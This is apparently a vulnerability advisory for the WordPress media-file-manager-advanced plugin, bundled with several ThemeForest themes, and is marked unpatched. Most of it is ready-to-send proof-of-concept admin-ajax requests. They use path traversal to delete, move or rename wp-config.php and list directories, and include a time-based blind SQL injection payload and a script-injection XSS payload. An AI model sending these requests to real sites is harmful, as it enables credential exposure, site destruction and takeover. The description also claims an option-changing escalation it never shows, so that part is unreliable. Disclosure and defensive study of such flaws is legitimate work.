@@ -1,0 +1,88 @@
+WordPress media-file-manager-advanced Plugin Multiple Vulnerabilites
+
+Themes: Pont - Simpolio - Teardrop - vernissage
+
+Description:
+suffers from a previlige escalation vulnerability, any authenticated user can trigger this vulnerability due to weak permissions checking.
+an attacker can update options( such as changing user's default role,registration state and others' ), which may lead to executing commands/code on the server and taking over the website.
+
+Homepage:
+http://themeforest.net/item/pont-multipurpose-wordpress-theme/273142
+http://themeforest.net/item/vernissage-responsive-photographyportfolio-theme/4436204
+http://themeforest.net/item/simpolio-fullscreen-portfolio-blog-wp-theme/397050
+http://themeforest.net/item/teardrop-flexible-photo-portfolio-wp-theme/510900
+
+Affected Version:
+<= 1.1.5
+
+Vulnerability Scope:
+LFD,SQL,XSS,Site Ruining and Changing of Content
+
+Authorization Required:
+User
+
+Proof of Concept:
+
+Post Delete
+http://domain.tld/wp-admin/admin-ajax.php?action=mfma_relocator_delete
+post: id=17
+
+MKDIR
+http://domain.tld/wp-admin/admin-ajax.php?action=mfma_relocator_mkdir
+newdir=EVEXFOLDER
+
+folder exists: http://domain.tld/wp-contents/uploads/EVEXFOLDER
+
+RMDIR (Dir Must Be Empty)
+http://domain.tld/wp-admin/admin-ajax.php?action=mfma_relocator_delete_empty_dir
+dir=EVEXFOLDER&name=
+
+not found: http://domain.tld/wp-contents/uploads/EVEXFOLDER
+
+UNLINK
+http://domain.tld/wp-admin/admin-ajax.php?action=mfma_relocator_delete
+dir=../../&name=wp-config.php
+
+no more wp-config.php
+
+Blind SQL INJECTION
+http://domain.tld/wp-admin/admin-ajax.php?action=mfma_relocator_get_image_insert_screen
+id=1 AND (SELECT * FROM (SELECT(SLEEP(10)))LCKZ) 
+
+Sleeps for 10 seconds
+
+XSS
+http://domain.tld/wp-admin/admin-ajax.php?action=mfma_relocator_get_image_insert_screen
+id="</button><script>alert(1)</script>
+
+Alerts(1)
+
+Update Post
+http://domain.tld/wp-admin/admin-ajax.php?action=mfma_relocator_update_media_information
+id=34&title=New_Title&caption=bla&description=Dummy Description
+
+Move Files
+http://domain.tld/wp-admin/admin-ajax.php?action=mfma_relocator_move
+dir_from=../../&items=wp-config.php&dir_to=
+
+now wp-config.php is in /wp-content/uploads/wp-config.php
+
+
+Renaming Files
+http://domain.tld/wp-admin/admin-ajax.php?action=mfma_relocator_rename
+dir=../../&from=wp-config.php&to=wp-config.txt
+
+now wp-config.php is renamed to wp-config.txt 
+
+Directory Listing 
+http://domain.tld/wp-admin/admin-ajax.php?action=mfma_relocator_getdir
+dir=../../
+
+will list all files and directories
+
+Fix:
+No Fix Available at The Moment.
+
+Time line:
+Notified Vendor - No Reply
+Publish Disclosure
